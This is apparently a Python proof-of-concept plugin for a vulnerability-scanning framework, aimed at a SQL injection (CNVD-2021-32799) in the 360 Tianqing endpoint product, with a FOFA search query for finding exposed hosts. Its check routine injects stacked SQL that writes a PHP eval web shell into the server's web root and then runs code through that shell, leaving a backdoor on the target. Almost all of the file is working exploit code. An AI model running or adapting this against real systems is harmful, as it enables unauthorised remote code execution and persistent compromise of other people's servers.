# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
            公网上相关资产非常少，笔者全部测试一遍后也只找到几个成功案例。
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "360天擎前台SQL注入",                        # 漏洞名称
        "VulnID" : "CNVD-2021-32799",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "360天擎",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-12-13",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            360天擎存在前台注入，可利用该漏洞直接获取系统权限。
            参考：
            [2021hvv_vul/360天擎-前台sql注入.md at master · YinWC/2021hvv_vul](https://github.com/YinWC/2021hvv_vul/blob/master/0408/360%E5%A4%A9%E6%93%8E-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5.md)
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="360新天擎"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;--" # url自己按需调整
        url1 = self.target + "/1.php"
        data1 = {
            "1": "phpinfo();"
        }

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            req1 = requests.post(url1,data = data1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "php version" in req1.text.lower():#req.status_code == 200 and :
                vuln = [True,req1.text]
            else:
                vuln = [False,req1.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()